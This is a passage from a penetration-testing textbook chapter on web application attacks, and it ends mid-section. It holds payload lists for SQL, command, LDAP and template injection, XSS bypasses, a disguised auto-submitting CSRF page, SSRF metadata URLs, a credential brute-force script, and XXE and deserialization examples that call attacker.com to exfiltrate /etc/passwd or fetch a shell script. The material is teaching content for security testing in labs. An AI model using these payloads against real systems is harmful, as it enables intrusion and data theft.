# Web Application Penetration Testing

In this chapter, we'll explore the techniques and methodologies used in web application penetration testing. Web applications are among the most common attack vectors for malicious actors due to their public-facing nature and the complexity of modern web technologies. Understanding how to identify and exploit web vulnerabilities is essential for securing these critical assets.

## Learning Objectives

By the end of this chapter, you will be able to:

1. Understand the methodology for web application penetration testing
2. Identify common web application vulnerabilities using manual and automated techniques
3. Exploit various web vulnerabilities including injection flaws, authentication weaknesses, and access control issues
4. Use industry-standard tools for web application security testing
5. Implement client-side attack techniques
6. Understand API security testing approaches
7. Document web vulnerabilities and provide effective remediation recommendations

## 1. Web Application Penetration Testing Methodology

### 1.1 Planning and Preparation

Proper planning is essential before beginning a web application penetration test:

1. **Defining Scope**:
   - Target web applications and URLs
   - Testing environments (production, staging, development)
   - Testing limitations and constraints
   - Excluded functionality
   - Testing timeframes

2. **Information Gathering**:
   - Application architecture
   - Technology stack
   - Authentication mechanisms
   - Business logic understanding
   - Previous security assessments

3. **Testing Approach**:
   - Black box (no prior knowledge)
   - Grey box (partial knowledge)
   - White box (complete knowledge and source code access)
   - Authenticated vs. unauthenticated testing
   - Manual vs. automated testing

```
# Web Application Penetration Testing Methodology (ASCII Diagram)

+------------------------+     +------------------------+     +------------------------+
|                        |     |                        |     |                        |
|  Planning/Preparation  | --> |  Reconnaissance        | --> |  Vulnerability         |
|                        |     |  & Mapping             |     |  Identification        |
|                        |     |                        |     |                        |
+------------------------+     +------------------------+     +------------------------+
                                                                          |
                                                                          v
+------------------------+     +------------------------+     +------------------------+
|                        |     |                        |     |                        |
|  Reporting &           | <-- |  Impact Analysis       | <-- |  Exploitation          |
|  Remediation           |     |                        |     |                        |
|                        |     |                        |     |                        |
+------------------------+     +------------------------+     +------------------------+
```

### 1.2 Web Application Testing Frameworks

Several established frameworks guide web application penetration testing:

1. **OWASP Testing Guide**:
   - Comprehensive methodology for web application security testing
   - Covers information gathering, configuration management, authentication, session management, input validation, error handling, cryptography, business logic, client-side testing, and more
   - Provides detailed testing procedures and examples

2. **OWASP Web Security Testing Guide (WSTG)**:
   - Structured approach to web application security testing
   - Organized by test categories (e.g., Information Gathering, Configuration Management)
   - Includes test objectives, procedures, and expected results

3. **OWASP Application Security Verification Standard (ASVS)**:
   - Framework for security requirements and verification
   - Three levels of security verification (L1, L2, L3)
   - Detailed security controls across multiple categories

4. **PTES (Penetration Testing Execution Standard)**:
   - General penetration testing methodology applicable to web applications
   - Covers pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, and reporting

> **Knowledge Check:** What are the key differences between black box, grey box, and white box web application testing? What are the advantages and disadvantages of each approach?

## 2. Web Application Reconnaissance

### 2.1 Passive Information Gathering

Collecting information without directly interacting with the target application:

1. **OSINT for Web Applications**:
   - Domain and subdomain information
   - WHOIS records
   - Historical website data
   - Technology stack identification
   - Public code repositories

2. **Tools for Passive Reconnaissance**:
   - Shodan
   - Wayback Machine
   - BuiltWith
   - Wappalyzer
   - GitHub/GitLab repositories

3. **Information Sources**:
   - Search engines
   - Social media
   - Job postings
   - Public documentation
   - Error messages and leaks

```bash
# Example: Passive web application reconnaissance

# Step 1: Check WHOIS information
whois example.com

# Step 2: Identify subdomains using passive techniques
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Step 3: Check historical website data
# Visit: https://web.archive.org/web/*/example.com

# Step 4: Identify technologies with Wappalyzer
# Install Wappalyzer browser extension and visit the target site

# Step 5: Search for exposed source code
# GitHub search: "example.com" filename:config
# GitHub search: "example.com" password

# Step 6: Check for leaked information in search engines
# Google dorks:
# site:example.com filetype:pdf
# site:example.com inurl:admin
# site:example.com ext:sql OR ext:db OR ext:backup
```

### 2.2 Active Reconnaissance

Directly interacting with the target application to gather information:

1. **Web Server Fingerprinting**:
   - HTTP headers analysis
   - Server banners
   - Error page analysis
   - HTTP methods testing
   - Technology stack identification

2. **Content Discovery**:
   - Directory and file enumeration
   - Hidden files and directories
   - Backup files
   - Configuration files
   - API endpoints

3. **Application Mapping**:
   - Functionality identification
   - User roles and permissions
   - Authentication mechanisms
   - Input fields and parameters
   - Client-side code analysis

```bash
# Example: Active web application reconnaissance

# Step 1: HTTP headers analysis
curl -I https://example.com

# Step 2: Directory and file enumeration
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -o dirs.txt

# Step 3: Check for common backup files
for ext in bak old backup zip tar gz; do
  curl -s -o /dev/null -w "%{http_code}" https://example.com/config.$ext
  echo " - https://example.com/config.$ext"
done

# Step 4: Discover hidden files and directories
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403

# Step 5: Identify API endpoints
ffuf -u https://example.com/api/FUZZ -w /usr/share/wordlists/api_endpoints.txt -mc 200,401,403

# Step 6: Test HTTP methods
nmap --script http-methods --script-args http-methods.url-path='/admin/' example.com
```

### 2.3 Web Application Spidering

Automatically crawling web applications to discover content:

1. **Spidering Techniques**:
   - Automated crawling
   - Form submission
   - JavaScript execution
   - Authentication-aware spidering
   - Parameter discovery

2. **Spidering Tools**:
   - OWASP ZAP
   - Burp Suite Spider
   - Scrapy
   - Wget
   - HTTrack

3. **Spidering Considerations**:
   - Respecting robots.txt
   - Rate limiting
   - Avoiding destructive actions
   - Handling session management
   - Dealing with JavaScript-heavy applications

```python
# Example: Simple Python web crawler

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

class WebCrawler:
    def __init__(self, start_url, max_urls=100):
        self.start_url = start_url
        self.max_urls = max_urls
        self.visited_urls = set()
        self.urls_to_visit = [start_url]
        self.base_domain = urlparse(start_url).netloc
        
    def download_url(self, url):
        try:
            response = requests.get(url, timeout=10)
            print(f"Crawled: {url} [Status: {response.status_code}]")
            return response.text
        except Exception as e:
            print(f"Error crawling {url}: {e}")
            return ""
            
    def get_linked_urls(self, url, html):
        soup = BeautifulSoup(html, 'html.parser')
        for link in soup.find_all('a'):
            path = link.get('href')
            if path and not path.startswith('#'):
                path = urljoin(url, path)
                # Only include URLs from the same domain
                if urlparse(path).netloc == self.base_domain:
                    yield path
                    
    def extract_forms(self, url, html):
        soup = BeautifulSoup(html, 'html.parser')
        forms = soup.find_all('form')
        for i, form in enumerate(forms):
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            inputs = form.find_all('input')
            print(f"Form {i+1} on {url}:")
            print(f"  Action: {action}")
            print(f"  Method: {method}")
            print("  Inputs:")
            for input_field in inputs:
                input_type = input_field.get('type', '')
                input_name = input_field.get('name', '')
                input_value = input_field.get('value', '')
                print(f"    {input_name} ({input_type}): {input_value}")
            print()
    
    def add_url_to_visit(self, url):
        if url not in self.visited_urls and url not in self.urls_to_visit:
            self.urls_to_visit.append(url)
            
    def crawl(self, url):
        html = self.download_url(url)
        self.extract_forms(url, html)
        for linked_url in self.get_linked_urls(url, html):
            self.add_url_to_visit(linked_url)
            
    def run(self):
        while self.urls_to_visit and len(self.visited_urls) < self.max_urls:
            url = self.urls_to_visit.pop(0)
            if url in self.visited_urls:
                continue
            self.visited_urls.add(url)
            self.crawl(url)
            
# Example usage
if __name__ == "__main__":
    crawler = WebCrawler('https://example.com', max_urls=20)
    crawler.run()
    
    print(f"\nTotal URLs crawled: {len(crawler.visited_urls)}")
    for url in sorted(crawler.visited_urls):
        print(url)
```

> **Hands-on Exercise:** Set up a deliberately vulnerable web application like DVWA or Juice Shop in your lab environment. Use a combination of passive and active reconnaissance techniques to gather information about the application. Create a comprehensive map of the application including directories, files, endpoints, parameters, and technologies used. Document your findings and identify potential security issues based on the reconnaissance phase alone.

## 3. Common Web Vulnerabilities and Exploitation

### 3.1 Injection Flaws

Exploiting applications that fail to properly validate user input:

1. **SQL Injection**:
   - Technique: Inserting SQL code into application inputs
   - Impact: Unauthorized data access, authentication bypass, data modification
   - Testing: Manual input manipulation, automated tools (SQLmap)
   - Prevention: Parameterized queries, ORM frameworks, input validation

2. **Command Injection**:
   - Technique: Inserting OS commands into application inputs
   - Impact: Server compromise, unauthorized command execution
   - Testing: Injecting command separators and shell metacharacters
   - Prevention: Input validation, avoiding shell commands, using APIs

3. **LDAP Injection**:
   - Technique: Manipulating LDAP queries through user input
   - Impact: Authentication bypass, information disclosure
   - Testing: Injecting LDAP filter metacharacters
   - Prevention: Input sanitization, proper LDAP query construction

```bash
# Example: SQL injection testing

# Step 1: Basic tests for SQL injection
# Try these payloads in login forms, search boxes, and URL parameters:
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
admin' --
' UNION SELECT 1,2,3 --
' ORDER BY 10 --

# Step 2: Automated SQL injection with SQLmap
# Test a specific parameter:
sqlmap -u "https://example.com/page.php?id=1" -p id --dbs

# Test a form:
sqlmap -u "https://example.com/login.php" --forms --batch --dbs

# Dump a specific table:
sqlmap -u "https://example.com/page.php?id=1" -D database_name -T users --dump

# Step 3: Command injection testing
# Try these payloads in search forms, ping tools, etc.:
; ls -la
& whoami
| cat /etc/passwd
`id`
$(id)

# Step 4: Test for blind command injection
# Use time delays to detect blind injection:
; sleep 10
& ping -c 10 127.0.0.1
| timeout 10

# Step 5: Test for LDAP injection
# Try these payloads in login forms:
*)(uid=*))(|(uid=*
admin))(|(password=*)
*))%00
```

### 3.2 Authentication and Session Management Flaws

Exploiting weaknesses in authentication and session handling:

1. **Authentication Bypass**:
   - Technique: Circumventing login mechanisms
   - Methods: Default credentials, brute force, logic flaws
   - Testing: Credential stuffing, password spraying, logic manipulation
   - Prevention: Strong password policies, MFA, account lockout

2. **Session Hijacking**:
   - Technique: Stealing or forging session identifiers
   - Methods: Session fixation, XSS, network sniffing
   - Testing: Analyzing session token generation, token reuse tests
   - Prevention: Secure cookies, token regeneration, HTTPS

3. **Broken Authentication Flows**:
   - Technique: Exploiting flaws in authentication processes
   - Methods: Password reset flaws, registration weaknesses
   - Testing: Process flow analysis, request manipulation
   - Prevention: Secure design patterns, proper validation

```python
# Example: Authentication testing script

import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor

def test_login(url, username, password):
    """Test a single username/password combination"""
    data = {
        'username': username,
        'password': password,
        'submit': 'Login'
    }
    
    try:
        response = requests.post(url, data=data, allow_redirects=True)
        
        # Check for successful login indicators
        # This will vary depending on the application
        if "Invalid username or password" not in response.text and "Login failed" not in response.text:
            print(f"[+] Possible valid credentials found: {username}:{password}")
            print(f"    Response length: {len(response.text)}")
            print(f"    Response status: {response.status_code}")
            return True
        return False
    except Exception as e:
        print(f"[-] Error testing {username}:{password} - {str(e)}")
        return False

def brute_force(url, usernames, passwords, max_workers=10):
    """Perform a brute force attack against the login page"""
    print(f"[*] Starting brute force attack against {url}")
    print(f"[*] Testing {len(usernames)} usernames and {len(passwords)} passwords")
    
    successful = []
    total_attempts = len(usernames) * len(passwords)
    current_attempt = 0
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for username in usernames:
            for password in passwords:
                current_attempt += 1
                if current_attempt % 10 == 0:
                    print(f"[*] Progress: {current_attempt}/{total_attempts} ({current_attempt/total_attempts*100:.2f}%)")
                
                # Add a small delay to avoid overwhelming the server
                time.sleep(0.1)
                
                result = executor.submit(test_login, url, username, password)
                if result.result():
                    successful.append((username, password))
    
    return successful

def test_default_credentials(url):
    """Test for default credentials"""
    default_creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', 'admin123'),
        ('administrator', 'administrator'),
        ('root', 'root'),
        ('root', 'toor'),
        ('user', 'user'),
        ('guest', 'guest')
    ]
    
    print("[*] Testing default credentials")
    for username, password in default_creds:
        if test_login(url, username, password):
            print(f"[+] Default credentials work: {username}:{password}")
            return True
    
    return False

def test_username_enumeration(url, usernames):
    """Test for username enumeration"""
    print("[*] Testing for username enumeration")
    results = {}
    
    for username in usernames:
        response = requests.post(url, data={
            'username': username,
            'password': 'invalid_password_123',
            'submit': 'Login'
        })
        
        # Store response characteristics
        results[username] = {
            'length': len(response.text),
            'status': response.status_code,
            'time': response.elapsed.total_seconds()
        }
    
    # Analyze results for differences
    lengths = set(r['length'] for r in results.values())
    times = [r['time'] for r in results.values()]
    
    if len(lengths) > 1:
        print("[+] Possible username enumeration via response length differences")
        for username, data in results.items():
            print(f"    {username}: {data['length']} bytes")
    
    if max(times) - min(times) > 1.0:  # 1 second threshold
        print("[+] Possible username enumeration via timing differences")
        for username, data in results.items():
            print(f"    {username}: {data['time']:.2f} seconds")

# Example usage
if __name__ == "__main__":
    login_url = "https://example.com/login.php"
    
    # Test for default credentials
    test_default_credentials(login_url)
    
    # Test for username enumeration
    test_username_enumeration(login_url, ['admin', 'root', 'user', 'nonexistent'])
    
    # Perform limited brute force
    usernames = ['admin', 'administrator', 'root', 'user']
    passwords = ['password', 'admin123', '123456', 'qwerty', 'welcome']
    successful = brute_force(login_url, usernames, passwords)
    
    if successful:
        print("\n[+] Successful logins:")
        for username, password in successful:
            print(f"    {username}:{password}")
    else:
        print("\n[-] No successful logins found")
```

### 3.3 Cross-Site Scripting (XSS)

Exploiting applications that fail to properly sanitize user input that is reflected in output:

1. **Reflected XSS**:
   - Technique: Injecting scripts that are immediately returned to the user
   - Impact: Session theft, phishing, client-side attacks
   - Testing: Injecting script tags in parameters, headers, and forms
   - Prevention: Output encoding, Content Security Policy (CSP)

2. **Stored XSS**:
   - Technique: Injecting scripts that are stored and later displayed to users
   - Impact: Affects multiple users, persistent attacks
   - Testing: Submitting script payloads in stored content (comments, profiles)
   - Prevention: Input validation, output encoding, CSP

3. **DOM-based XSS**:
   - Technique: Exploiting client-side JavaScript that processes data unsafely
   - Impact: Client-side manipulation, data theft
   - Testing: Analyzing client-side code, manipulating DOM sources
   - Prevention: Safe JavaScript practices, avoiding dangerous functions

```html
<!-- Example: XSS testing payloads -->

<!-- Basic XSS test -->
<script>alert('XSS')</script>

<!-- HTML attribute context -->
" onmouseover="alert('XSS')" "
' onmouseover='alert("XSS")' '
" autofocus onfocus="alert('XSS')" "

<!-- JavaScript context -->
'-alert('XSS')-'
\';alert('XSS');//

<!-- URL context -->
javascript:alert('XSS')

<!-- HTML5 contexts -->
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">

<!-- Bypass filters -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<IMG SRC=j&#X41vascript:alert('XSS')>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS')>

<!-- DOM XSS test -->
<!-- For URL fragment like example.com/page#name=value -->
<script>
// Vulnerable code
var pos = document.URL.indexOf("name=") + 5;
var name = document.URL.substring(pos, document.URL.length);
document.write("Hello, " + name);
</script>

<!-- Payload: example.com/page#name=<img src=x onerror=alert('XSS')> -->
```

### 3.4 Cross-Site Request Forgery (CSRF)

Exploiting applications that trust requests from authenticated users:

1. **CSRF Mechanics**:
   - Technique: Forcing users to perform unwanted actions on sites they're authenticated to
   - Impact: Unauthorized actions, data modification, account takeover
   - Testing: Creating cross-domain requests that perform actions
   - Prevention: Anti-CSRF tokens, SameSite cookies, custom headers

2. **CSRF Testing Methodology**:
   - Identify sensitive functions
   - Analyze request patterns
   - Check for CSRF protections
   - Create proof-of-concept exploits
   - Test across browsers

3. **CSRF and Modern Web Applications**:
   - SPA considerations
   - API security
   - Token-based authentication
   - CORS implications

```html
<!-- Example: CSRF attack proof of concept -->

<!-- CSRF PoC for changing a user's email address -->
<!-- Assumes the vulnerable application uses this request format:
     POST /account/update
     email=new@example.com&csrf_token=1234 -->

<!DOCTYPE html>
<html>
<head>
    <title>Cute Cats</title>
</head>
<body>
    <h1>Adorable Cat Pictures</h1>
    <img src="https://placekitten.com/400/300" alt="Cute cat">
    
    <!-- Hidden CSRF form that auto-submits -->
    <form id="csrf-form" action="https://vulnerable-site.com/account/update" method="POST" style="display:none;">
        <input type="hidden" name="email" value="attacker@evil.com">
        <!-- No CSRF token included -->
    </form>
    
    <script>
        // Auto-submit the form when the page loads
        window.onload = function() {
            document.getElementById("csrf-form").submit();
        }
    </script>
    
    <p>Thanks for visiting! Here's another cute cat:</p>
    <img src="https://placekitten.com/500/300" alt="Another cute cat">
</body>
</html>
```

### 3.5 Server-Side Request Forgery (SSRF)

Exploiting applications to make server-side requests to unintended locations:

1. **SSRF Mechanics**:
   - Technique: Manipulating server-side requests to access internal resources
   - Impact: Internal reconnaissance, data access, service exploitation
   - Testing: Modifying URLs in server-side request parameters
   - Prevention: URL validation, network segmentation, allow lists

2. **SSRF Targets**:
   - Internal web services
   - Cloud metadata services
   - Administrative interfaces
   - Database servers
   - Internal APIs

3. **SSRF Bypass Techniques**:
   - URL encoding
   - Alternative IP representations
   - DNS rebinding
   - Non-HTTP protocols
   - Redirects

```bash
# Example: SSRF testing payloads

# Step 1: Basic SSRF tests
# Try these in URL parameters, API endpoints, etc.
http://localhost/admin
http://127.0.0.1/admin
http://127.0.0.1:8080/admin
http://internal-service/api/data

# Step 2: Cloud metadata service access
# AWS
http://169.254.169.254/latest/meta-data/
# Azure
http://169.254.169.254/metadata/instance
# Google Cloud
http://metadata.google.internal/computeMetadata/v1/

# Step 3: Alternative IP representations
# Decimal notation
http://2130706433/admin
# Hexadecimal notation
http://0x7f000001/admin
# Octal notation
http://0177.0000.0000.0001/admin
# IPv6 representation
http://[::1]/admin

# Step 4: DNS rebinding attack setup
# Register a domain that resolves to 127.0.0.1 after initial resolution
# Use a service like http://rebind.it

# Step 5: URL scheme tests
file:///etc/passwd
dict://localhost:11211/stats
gopher://localhost:25/xSMTP

# Step 6: Bypass filters with redirects
# Set up a redirect from:
https://example.com/redirect
# To:
http://localhost/admin
```

> **Knowledge Check:** What is the difference between reflected XSS, stored XSS, and DOM-based XSS? How would you test for each type, and what are the appropriate remediation strategies?

## 4. Web Application Security Testing Tools

### 4.1 Proxy Tools

Intercepting and modifying web traffic for security testing:

1. **Burp Suite**:
   - Core functionality: HTTP proxy, scanner, intruder, repeater
   - Use cases: Request interception, manipulation, automated attacks
   - Features: Session handling, extension support, vulnerability scanning
   - Community vs. Professional editions

2. **OWASP ZAP**:
   - Core functionality: Intercepting proxy, active scanner, fuzzer
   - Use cases: Automated scanning, API testing, continuous integration
   - Features: Open source, scriptable, extensible
   - Automated and guided scan modes

3. **Proxy Configuration**:
   - Browser setup
   - Certificate installation
   - Scope configuration
   - Filter settings
   - Mobile device proxying

```bash
# Example: Setting up and using OWASP ZAP from the command line

# Step 1: Install ZAP
sudo apt install zaproxy

# Step 2: Start ZAP in daemon mode
zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true

# Step 3: Configure browser to use proxy
# Set proxy to 127.0.0.1:8080

# Step 4: Import ZAP's certificate in browser
# Visit http://zap/ and download/install the certificate

# Step 5: Run an automated scan via API
curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://example.com"

# Step 6: Spider the target
curl "http://localhost:8080/JSON/spider/action/scan/?url=https://example.com"

# Step 7: Get alerts (vulnerabilities)
curl "http://localhost:8080/JSON/core/view/alerts/"

# Step 8: Generate HTML report
curl "http://localhost:8080/OTHER/core/other/htmlreport/" > zap_report.html

# Step 9: Shutdown ZAP
curl "http://localhost:8080/JSON/core/action/shutdown/"
```

### 4.2 Vulnerability Scanners

Automated tools for identifying web vulnerabilities:

1. **Web Application Scanners**:
   - Nikto
   - Acunetix
   - Nessus
   - Burp Suite Professional
   - OWASP ZAP

2. **Specialized Scanners**:
   - SQLmap (SQL injection)
   - WPScan (WordPress)
   - CMSmap (Content Management Systems)
   - Retire.js (JavaScript libraries)
   - SSL Labs (TLS/SSL configuration)

3. **Scanner Limitations**:
   - False positives and negatives
   - Business logic flaws
   - Authentication handling
   - Modern web technologies
   - Custom vulnerabilities

```bash
# Example: Using Nikto for web vulnerability scanning

# Step 1: Basic Nikto scan
nikto -h https://example.com

# Step 2: Scan with authentication
nikto -h https://example.com -id admin:password

# Step 3: Scan specific paths
nikto -h https://example.com -root /admin/

# Step 4: Tune scan options
# -T 0-9: Select specific test categories
# -e 1: Enable plugin checks
nikto -h https://example.com -T 2,4,6,8 -e 1

# Step 5: Output results to file
nikto -h https://example.com -o nikto_results.html -Format html

# Step 6: Scan multiple hosts
nikto -h https://example.com,https://test.example.com

# Step 7: Use with proxy (e.g., Burp Suite)
nikto -h https://example.com -useproxy http://localhost:8080
```

### 4.3 Fuzzing Tools

Tools for discovering vulnerabilities through automated input manipulation:

1. **Web Fuzzing Concepts**:
   - Parameter fuzzing
   - Header fuzzing
   - Path fuzzing
   - Value fuzzing
   - Protocol fuzzing

2. **Popular Fuzzing Tools**:
   - Burp Intruder
   - OWASP ZAP Fuzzer
   - Wfuzz
   - FFuF
   - FuzzDB

3. **Fuzzing Strategies**:
   - Dictionary-based
   - Pattern-based
   - Mutation-based
   - Grammar-based
   - Evolutionary

```bash
# Example: Web fuzzing with FFuF

# Step 1: Directory and file discovery
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ

# Step 2: Parameter fuzzing
ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.com/api?PARAM=VAL

# Step 3: Subdomain enumeration
ffuf -w subdomains.txt -u https://FUZZ.example.com

# Step 4: Virtual host discovery
ffuf -w vhosts.txt -u https://example.com -H "Host: FUZZ.example.com"

# Step 5: POST data fuzzing
ffuf -w payloads.txt -X POST -d "username=admin&password=FUZZ" -u https://example.com/login

# Step 6: Fuzzing with filters
# Filter by response size
ffuf -w wordlist.txt -u https://example.com/FUZZ -fs 4242

# Filter by status code
ffuf -w wordlist.txt -u https://example.com/FUZZ -fc 404

# Step 7: Using multiple wordlists
ffuf -w users.txt:USER -w passes.txt:PASS -X POST -d "username=USER&password=PASS" -u https://example.com/login
```

> **Hands-on Exercise:** Set up Burp Suite or OWASP ZAP as a proxy for your browser. Configure your browser to trust the proxy's certificate. Browse a deliberately vulnerable application like DVWA or Juice Shop through the proxy. Use the proxy to intercept and modify requests, focusing on:
> 1. Changing parameter values to test for injection flaws
> 2. Modifying session cookies to attempt session hijacking
> 3. Bypassing client-side validation by intercepting and modifying requests
> 4. Using the scanner (if available) to identify potential vulnerabilities
> 
> Document your findings and explain how each vulnerability could be exploited in a real-world scenario.

## 5. Advanced Web Application Attacks

### 5.1 Insecure Deserialization

Exploiting applications that deserialize untrusted data:

1. **Serialization Concepts**:
   - Object serialization and deserialization
   - Serialization formats (JSON, XML, binary)
   - Language-specific serialization (Java, PHP, .NET)
   - Serialization in web applications

2. **Deserialization Vulnerabilities**:
   - Remote code execution
   - Object injection
   - DoS attacks
   - Authentication bypass

3. **Testing for Insecure Deserialization**:
   - Identifying serialized data
   - Manipulating serialized objects
   - Using ysoserial and similar tools
   - Language-specific payloads

```java
// Example: Java deserialization attack

// Step 1: Identify serialized Java objects
// Look for base64 strings starting with rO0 (base64 of Java serialization header)
// Example: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3...

// Step 2: Generate malicious serialized object with ysoserial
// Command: java -jar ysoserial.jar CommonsCollections1 'wget http://attacker.com/shell.sh -O /tmp/shell.sh' > payload.bin

// Step 3: Encode the payload
// Command: base64 -w 0 payload.bin > payload.b64

// Step 4: Deliver the payload
// Replace the original serialized data with your payload in:
// - Cookies
// - Hidden form fields
// - URL parameters
// - POST data

// Step 5: PHP deserialization example
// Vulnerable PHP code:
class User {
    public $username;
    public $isAdmin = false;
    
    function __wakeup() {
        // This runs when the object is deserialized
        echo "User object deserialized: " . $this->username;
    }
    
    function __destruct() {
        // This runs when the object is destroyed
        if ($this->isAdmin) {
            echo "Admin privileges granted to: " . $this->username;
        }
    }
}

// Vulnerable code that deserializes user input
$user_data = $_COOKIE['user'];
$user = unserialize($user_data);

// Step 6: Create malicious PHP serialized object
// Original: O:4:"User":2:{s:8:"username";s:5:"guest";s:7:"isAdmin";b:0;}
// Modified: O:4:"User":2:{s:8:"username";s:5:"hacker";s:7:"isAdmin";b:1;}
```

### 5.2 XML External Entity (XXE) Attacks

Exploiting XML parsers that process external entity references:

1. **XXE Concepts**:
   - XML parsing and DTDs
   - External entity references
   - Parameter entities
   - XXE attack vectors

2. **XXE Attack Types**:
   - File disclosure
   - Server-side request forgery
   - Denial of service
   - Remote code execution (in some cases)

3. **Testing for XXE**:
   - Identifying XML input points
   - Testing external entity references
   - Blind XXE techniques
   - Out-of-band XXE

```xml
<!-- Example: XXE attack payloads -->

<!-- Step 1: Basic file reading XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- Step 2: Blind XXE with out-of-band interaction -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>Blind XXE test</foo>

<!-- Contents of evil.dtd on attacker's server -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
%param1;
%exfil;

<!-- Step 3: XXE for SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/api/secret">
]>
<foo>&xxe;</foo>

<!-- Step 4: XXE DoS attack (billion laughs) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 5.3 Server-Side Template Injection (SSTI)

Exploiting template engines that process user input as template code:

1. **Template Injection Concepts**:
   - Server-side templates
   - Template syntax and evaluation
   - Common template engines (Jinja2, Twig, FreeMarker)
   - Context of injection

2. **SSTI Attack Vectors**:
   - Remote code execution
   - Information disclosure
   - File reading
   - Denial of service

3. **Testing for SSTI**:
   - Template syntax testing
   - Engine fingerprinting
   - Payload construction
   - Exploitation techniques

```bash
# Example: SSTI testing and exploitation

# Step 1: Basic SSTI detection payloads
# Try these in input fields, URL parameters, etc.
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}

# Step 2: Template engine fingerprinting
# Jinja2/Twig
{{config}}
{{config.items()}}
{{7*'7'}}

# FreeMarker
<#list [1,2,3] as i>${i}</#list>

# Velocity
#set($x = 7*7)${x}

# JSP
<%= new java.util.Date() %>

# Step 3: Jinja2 RCE payload
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Step 4: Twig RCE payload
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Step 5: FreeMarker RCE payload
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Step 6: Spring RCE payload
${T(java.lang.Runtime).getRuntime().exec('id')}

# Step 7: Velocity RCE payload
#set($cmd="id")
#set($runtime=$Runtime.getRuntime())
#set($process=$runtime.exec($cmd))
```

### 5.4 Business Logic Flaws

Exploiting application logic rather than technical vulnerabilities:

1. **Business Logic Vulnerability Types**:
   - Authentication bypasses
   - Authorization flaws
   - Input validation gaps
   - Process flow manipulation
   - Race conditions

2. **Testing for Logic Flaws**:
   - Understanding application functionality
   - Process flow mapping
   - Parameter manipulation
   - State manipulation
   - Timing attacks

3. **Common Logic Flaws**:
   - Insufficient validation
   - Missing steps in processes
   - Weak enforcement of business rules
   - Inconsistent security controls
   - Exploitable assumptions

```
# Example: Business logic flaw testing methodology

## Step 1: Map the application
- Identify all functionality
- Document normal process flows
- Identify validation points
- Map authorization checks

## Step 2: Test authentication logic
- Password reset functionality
  - Can you reset another user's password?
  - Can you bypass email verification?
  - Are tokens properly validated?
- Account registration
  - Can you create privileged accounts?
  - Can you bypass verification steps?
- Multi-step processes
  - Can steps be skipped or performed out of order?

## Step 3: Test authorization logic
- Horizontal privilege escalation
  - Change user IDs in requests
  - Access another user's data
- Vertical privilege escalation
  - Access admin functionality
  - Perform privileged actions

## Step 4: Test shopping cart/payment logic
- Price manipulation
  - Modify prices in requests
  - Change currency
  - Apply multiple discounts
- Quantity manipulation
  - Negative quantities
  - Fractional quantities
  - Extremely large quantities

## Step 5: Test for race conditions
- Concurrent requests
  - Multiple simultaneous transactions
  - Duplicate form submissions
- Time-sensitive operations
  - Token validation
  - Session handling
```

> **Knowledge Check:** What makes business logic flaws different from technical vulnerabilities like XSS or SQL injection? Why are they often missed by automated vulnerability scanners?

## 6. Client-Side Attacks

### 6.1 DOM-Based Vulnerabilities

Exploiting client-side JavaScript that processes data unsafely:

1. **DOM Manipulation Risks**:
   - Unsafe JavaScript methods
